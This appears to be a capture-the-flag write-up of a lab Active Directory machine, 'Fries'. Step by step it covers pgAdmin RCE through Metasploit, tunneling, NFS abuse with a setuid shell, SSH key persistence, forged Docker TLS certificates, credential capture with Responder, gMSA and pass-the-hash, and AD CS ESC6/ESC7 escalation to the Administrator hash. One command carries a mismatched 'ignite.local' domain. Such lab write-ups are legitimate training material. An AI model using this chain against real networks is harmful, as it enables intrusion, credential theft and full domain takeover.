Start_IP-address:_`10.129.244.72`
Start_credentials:_`d.cooper@fries.htb_:_D4LE11maan!!`
CTF_-_Insane_difficulty_

**Reconnaissance**_

```
nmap_--top-ports_10000_-sC_-sV_10.129.244.72
```

It's_Active_Directory_box_

Name_of_domain_controller_and_domain._Added_to_`/etc/hosts`_file
```
fries.htb
DC01.fries.htb
```

Non-Standart_ports_runned_on_DC

```
22/tcp____open__ssh_
80/tcp____open__http__nginx_1.18.0_(Ubuntu)
443/tcp___open__ssl/http__nginx_1.18.0_(Ubuntu)
593/tcp___open__ncacn_http____Microsoft_Windows_RPC_over_HTTP_1.0
2179/tcp__open__vmrdp?
```

clock-skew_=_7h

```
sudo_ntpdate_dc01.fries.htb
```

`HTTP`_port

In_`/about`_directory_i_found_a_possible_usernames
```
Emma_Thompson
Daniel_Rodriguez
Sarah_Chen
```

After_crafting_possible_AD_usernames_and_doing_`AS-REP`_no_one_was_detected

Discovered_a_subdomain_`code`_,_add_to_`/etc/hosts`

```
ffuf_-u_http://fries.htb/_-H_"Host:_FUZZ.fries.htb"_-w_/home/kali/wordlists/discovery/DNS/subdomains-top1million-20000.txt_-fs_154
```

In_this_subdomain_exists_a_`gitea`_service_,_and_we_can_log_in_with_start_creds

In_app_configuration_(`README.md`)_discovered_a_new_subdomain_``db-mgmt05``_in_which_is_ran_a_`pgAdmin_4`_service_database
For_database_view__`pgAdmin_4`_i_must_have_a_`root`_pass_,_i_clone_this_repository_to_look_up_for_commits

```
git_log
git_show_be59cceb54b56f00778822395bdf656216ab4b9f
```

In_intial_commit_i_found_a_root_pass_for_`postgresql`_

```
DATABASE_URL=postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db
SECRET_KEY=y0st528wn1idjk3b9a
```

And_with_root_credentials_i_logged_in_database_`fries.htb`_

Version_of_`PgAdmin_4`__9.1_is_vulnerable_to_`RCE`_with_`CVE-2025-2945`_
Impact:
Remote_Code_Execution_security_vulnerability_in_`pgAdmin_4`._The_vulnerability_is_associated_with_the_2_POST_endpoints; `/sqleditor/query_tool/download`,_where_the_`query_commited`_parameter_and `/cloud/deploy`_endpoint,_where_the_high_availability_parameter_is unsafely_passed_to_the_Python_eval()_function,_allowing_arbitrary_code_execution._This_issue_affects_`pgAdmin_4`:_before_9.2.

I_use_a_module_in_`matesploit`_framework_named_as_`multi/http/pgadmin_query_tool_authenticated`

![](images/Pasted_image_20260214193002.png)

`Meterpreter`_:_
![](images/Pasted_image_20260214193037.png)

And_we_obtain_remote_code_execution_to_linux_host_as_`pgadmin`._After_enumeration_i_mentioned_that_we_are_in_`Docker_Container`_then_i_check_an_environment_variables_and_found_a_password_

```
>_env
Friesf00Ds2025!!
```

Also_is_interesting_network_in_`ifconfig`

![](images/Pasted_image_20260214211821.png)

So_after_tunneling_we_could_have_access_to_local_network_,_i_will_use_a_`ligolo-proxy`_._When_the_agent_is_delivered_to_target_container:

Kali_machine:
```
sudo_ligolo-proxy_-selfcert_-laddr_'10.10.15.225:443'
```

Target_container:
```
./agent_-connect_10.10.15.225:443_-retry_-ignore-cert
```

Also_remembering_that_i_am_in_AD_environment_i_ping_a_`DC`_to_know_his_interface
![](images/Pasted_image_20260214212528.png)

So_we_got_two_interfaces_in_local_network

```
192.168.100.0/24_#_domain_exists_only_192.168.100.1
172.18.0.0/24_#_containers
```


After_simple_enumeration_with_`nmap`_and_`ntx`_i_find_a_`NFS`_ran_in_`172.18.0.1`_host

![](images/Pasted_image_20260214213707.png)

Shares:
![](images/Pasted_image_20260214222316.png)

Checking_a_`NFS`_shares_i_mentioned_that_there_is_mounted_disk_and_probably_for_user_`srv`
Mention_that_root_escape_in_True_it's_a_serious_misconfiguration_and_we_can_download_all_files_in_mounted_disk._`/etc/shadow`_has_`root`_access.
![](images/Pasted_image_20260214214720.png)

Main_goal_of_this_misconfig_to_create_a_new_user_and_add_him_to_`/etc/shadow`_and_`/etc/passwd`_files.
Create_a_password_hash:
```
openssl_passwd_-6_GreatPassword
```

![](images/Pasted_image_20260214215736.png)
Now_replace_target_files_in_system
![](images/Pasted_image_20260214223909.png)

It's_not_worked_because_in_`/etc/exports`_we_doesn't_have_a_`no_root_squash`
![](images/Pasted_image_20260214224006.png)

But_i_have_an_other_trick_in_this_situation_._From_`/etc/passwd`_file_we_know_what_users_exists_in_target_system_the_most_interesting_is_`svc`_and_`barmen`_and_i_tried_to_brute-force_a_credentials_with_existing_passwords_by_ssh_connection_and_we_are_on

```
svc_:_Friesf00Ds2025!!
```

It's_an_initial_foothold_in_domain_but_ONLY_in_ssh_so_we_still_need_`barmen`

On_`NFS`_share_`/srv/web.fries.htb/certs`_we_got_some_certificates
![](images/Pasted_image_20260214225502.png)![](images/Pasted_image_20260214225647.png)

And_there_nothing_so_the_last_trick_it's_to_use_this_`NFS`_share_so_first_we_need_to_create_the_same_user_as_in_target_system_second_we_need_to_mount_`NFS`_share_in_our_kali_machine.

User_creation_from_`/etc/passwd`_file_taken_from_`NFS`
```
sudo_useradd_-r_-u_117_-g_120_-c_"Backup_and_Recovery_Manager_for_PostgreSQL,,,"_-d_/var/lib/barman_-s_/bin/bash_barman
```

Mounting_an_`NFS`_share_to_out_computer
```
mount_-t_nfs_172.18.0.1:/srv/web.fries.htb_/mnt/nfs
```

Also_we_get_nothing_if_we_want_to_copy_a_default_`/bin/bash`_because_of_different_versions_of_`GLIBC`_so_i_take_a_

```
sudo_apt_install_bash-static
```

And_binary_exists_in:
```
/usr/bin/bash-static
```

The_main_goal_to_create_a_bash_file_in_`NFS`_directory_and_execute_him_on_target_system

File_creation(Kali_machine):
```
cp_/usr/bin/bash-static_shell
chmod_+s_shell
```

Execution(target_machine):
```
./shell_-p
```

All_was_done_in_directory
```
/srv/web.fries.htb/shared_#_target
/mnt/nfs/shared_#_kali_machine
```

After_shell_execution_we_got_a_shell_as_`barmen`._We_are_`svc`_but_can_do_anything_what_`barmen`_can_do_
![](images/Pasted_image_20260215002723.png)

Then_i_like_to_do_`persistance`_in_target_host._I_create_my_own_ssh_key

Home_`barman`_directory
```
/var/lib/barman
```

Create_ssh_key(kali_machine)
```
ssh-keygen_-t_rsa_-b_4096
```

Permisions_and_creation(target)
```
mkdir_.ssh
chmod_700_.ssh
echo_'ssh-rsa_AAAAB_<KEY>_4/AHSqXzVQ==_kali@kali'_>>_.ssh/authorized_keys
chmod_600_.ssh/authorized_keys
```

Log_in
```
ssh_barman@fries.htb_-i_id_rsa.barmen
```

Advantage_of_this_that_we_are_fully_user_`barman`_via_ssh
![](images/Pasted_image_20260215005429.png)

Working_with_`NFS`_again_our_goal_in_credentials_in_Active_Directory_environment_and_one_thing_that_i_mentioned_it_is_certs_directory_in_`NFS`_share_
![](images/Pasted_image_20260215012802.png)
Interesting_group_has_access_named_as_`Infra_Managers`_._Previously_we_discover_what_exists_in_this_but_directory.
In_kali_box_i_see_that_group_which_has_access_to_`/certs`_named_as_`59605603`
![](images/Pasted_image_20260215013139.png)

So_i_can_create_this_group_and_add_myself_,_after_copy_all_files

New_group_creation(kali_box)
```
sudo_groupadd_-g_59605603_certgrp
```

Add_myself
```
sudo_usermod_-aG_59605603_kali
```

Group_activation
```
newgrp_certgrp
```

id_result
```
id
uid=1000(kali)_gid=59605603(certgrp)_groups=59605603(certgrp),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),102(scanner),107(bluetooth),114(kaboxer),115(wireshark),120(docker),1000(kali)
```

After_copy_all_files_
```
kali_/mnt/fries3/certs_$_cp_*_/home/kali/htb/machines/Fries/certs_
```

This_certificates_in_marked_as_`DockerCA`_so_probably_certificates_for_a_Docker_containers_so_i_can_create_self-signed_certificate_and_get_access_to_docker_containers._To_get_access_to_docker_we_must_tunnel_`2376`_to_`localhost`_we_know_that_port_is_ran_in_target_from_

```
ss_-tnlp
LISTEN_____0___4096____127.0.0.1:2376______0.0.0.0:*________________________
```

Tunneling_via_ssh
```
ssh_svc@fries.htb_-L_2376:127.0.0.1:2376
```

Then_we_need_to_get_access_to_docker_container_via_new_certificate_generation

New_cert_generation
```
openssl_genrsa_-out_certificate.pem_2048
```

And_this_will_be_a_docker_client's_private_key

Certificate_Signing_Request_creation
```
openssl_req_-new_\
__-key_certificate.pem_\
__-out_client-certificate.csr_\_
__-subj_"/CN=root"
```

Sign_the_client_certificate_using_the_daemon’s_CA
```
openssl_x509_-req_\
__-in_client-certificate.csr_\_#_created
__-CA_ca.pem_\
__-CAkey_ca-key.pem_\
__-CAcreateserial_\
__-out_cert.pem_\
__-days_365_\
__-sha256
```

Validation
```
openssl_x509_-in_cert.pem_-noout_-text_|_grep_-E_"Issuer|Subject"

openssl_verify_-CAfile_ca.pem_cert.pem_#_CN=root
```

Next_we_must_run_a_container_`LOCALY`_
```
docker_--tlsverify_\
__--tlscacert=ca.pem_\
__--tlscert=cert.pem_\
__--tlskey=certificate.pem_\
__-H=tcp://127.0.0.1:2376_ps
```

Getting_access_to_container
```
docker_--tlsverify___--tlscacert=ca.pem__--tlscert=cert.pem_--tlskey=certificate.pem_\
__-H=tcp://127.0.0.1:2376_exec_-it_f42_/bin/bash
```

![](images/Pasted_image_20260215155402.png)

As_we_see_there_`https://pwm.fries.htb`_
![](images/Pasted_image_20260215155502.png)

There_are__configuration_file_for_`LDAPS`_connection_if_we_change_him_to_our_IP-address_and_catch_him_by_`responder`_maybe_we_obtain_new_credentials

Config_file_searching
```
find_/_-type_f_-name_'PwmConfiguration.xml'_2>/dev/null
```

Location:_`/config/PwmConfiguration.xml`_

![](images/Pasted_image_20260215160832.png)

I_modify_file_via_`sed`_because_it_contains_error_with_`nano`_and_transferring
```
sed_-i_'s|ldaps://dc01.fries.htb:636|ldap://10.10.15.225:389|'_PwmConfiguration.xml
```

Run_`responder`
```
sudo_responder_-I_tun0
```

And_we_catch_a_new_clear-text_credentials
![](images/Pasted_image_20260215163753.png)

```
svc_infra_:_m6tneOMAh5p0wQ0d
```

And_this_credentials_is_valid_for_DC_authentication_

![](images/Pasted_image_20260215164140.png)

After_access_to_domain_`LDAP`_i_grep_information_by_`bloodhound`_
```
bloodhound-python_-d_fries.htb__-u_svc_infra_-p_m6tneOMAh5p0wQ0d_-c_all_-dc_dc01.fries.htb_-ns_192.168.100.1
```

NOTE:_It_must_be_done_through_tunneling__

So_during_enumeration_i_found_a_machine_account_`gMSA_CA_prod$`_and_user_`svc_infra`_has_privilege_to_read_`GMSA`_password_
```
nxc_ldap_dc01.fries.htb_-u_svc_infra_-p_m6tneOMAh5p0wQ0d_--gmsa
```

![](images/Pasted_image_20260215172859.png)

New_credentials:
```
gMSA_CA_prod$_:___:cb91dc519860daf4ccd15e89e5a9d5ad
```

Machine_account_`gMSA_CA_prod$`_has_`WinRM`_to_`DC`._Using_Pass-The-Hash_attack_authorize_by_`WinRM`
![](images/Pasted_image_20260215173138.png)


After_simple_enum_i_found_a_certificate_vulnerability_in_system_named
`ESC6_—_EDITF_ATTRIBUTE_SUBJECT_ALTNAME_2`
Principle:_Enables_the_ability_to_specify_an_arbitrary_Subject_Alternative_Name_(SAN)_in_certificate_requests.

Configuration_with_COM_API(WinRM)

Using_CertificateAuthority.Admin_COM_object
```
$CA_=_New-Object_-ComObject_CertificateAuthority.Admin
$Config_=_"DC01.fries.htb\fries-DC01-CA"
```

Calculate_a_new_value_and_current_value
```
$current_=_1114446
$new_=_$current_-bor_0x00040000
```

Apply_modification_
```
$CA.SetConfigEntry($Config,_"PolicyModules\CertificateAuthority_MicrosoftDefault.Policy",_"EditFlags",_$new)
```

Then_restart_CA_service
```
Restart-Service_certsvc_-Force
```

Verify
```
certutil_-config_"DC01.fries.htb\fries-DC01-CA"_-getreg_policy\EditFlags
```

![](images/Pasted_image_20260216005318.png)

Flag_`EDITF_ATTRIBUTESUBJECTALTNAME2`_=_40000_,_means_that_it_is_**ENABLED**

**ESC6**_allows_specifying_an_arbitrary_UPN_for_example_`administrator@fries.htb`_in_the_certificate_so_
**ESC16**_prevents_SID_validation_in_the_certificate,_allowing_identity_impersonation_Combined,_they_allow_requesting_a_certificate_for_any_user.

After_this_we_run_again_`certipy-ad`_and_find_a_`ESC7`_and_`ESC16`
![](images/Pasted_image_20260216010848.png)
```
certipy-ad_find_-u_gMSA_CA_prod$@fries.htb_-k_-no-pass_-target-ip__192.168.100.1_-dc-host_dc01.fries.htb_-vulnerable_-target_dc01.fries.htb
```

I_use_a_`kerberos`_authentication_
```
impacket-getTGT_-hashes_':cb91dc519860daf4ccd15e89e5a9d5ad'_fries.htb/gMSA_CA_prod$_-dc-ip_192.168.100.1
```

By_`ESC7`_-_User_has_a_dangerous_permissions_we_can_add_officer_to_CA_`fries-DC01-CA`_by_user_`svc_infra`_
An_officer_(Certificate_Manager)_in_Active_Directory_Certificate_Services_(AD_CS)_is_a_privileged_role_that_can_review,_approve,_deny,_and_issue_certificate_requests,_effectively_controlling_the_certificate_issuance_process_of_the_Certification_Authority.

```
certipy-ad_ca_-u_gMSA_CA_prod$@fries.htb_-k_-no-pass_-target-ip__192.168.100.1_-dc-host_dc01.fries.htb_-add-officer_svc_infra_-ca_fries-DC01-CA_-target_dc01.fries.htb
```

Now_user_`svc_infra`_
![](images/Pasted_image_20260216015702.png)

We_cat_try_to_request_cert_via_`SubCA`
![](images/Pasted_image_20260216020028.png)

This_becomes_a_`ESC6`_+_`ESC7`_certificate_exploitation
#####_**ESC6:**

It_occurs_when_a_misconfigured_template,_like_ENROLLEE_SUPPLIES_SUBJECT,_is_accessible_to_low-privileged_users,_allowing_exploitation_without_CA_access.

#####_**ESC7**:

The_CA_is_misconfigured_with_ACLs_(set_via_certsrv.msc),_giving_unprivileged_users_like_svc_infra@fries.htb__rights_such_as_ManageCA_or_ManageCertificates.


Request_certificate_as_administrator
```
certipy-ad_req_-u_svc_infra@fries.htb_-p_'m6tneOMAh5p0wQ0d'_-ca_fries-DC01-CA_-target_192.168.100.1_-template_SubCA_-upn_administrator@ignite.local_-dc-ip_192.168.100.1
```

Auth_as_administrator
```
certipy-ad_auth_-pfx_administrator.pfx_-dc-ip_192.168.100.1_
```

Creds
```
Administrator_:__:a773cb05d79273299a684a23ede56748
```

![](images/Pasted_image_20260216021842.png)
And_in_`C:\Users\Administrator\Desktop`_directory_exists_`user.txt`_and_`root.txt`_

Thanks_for_reading_
See_you_soon

Colosion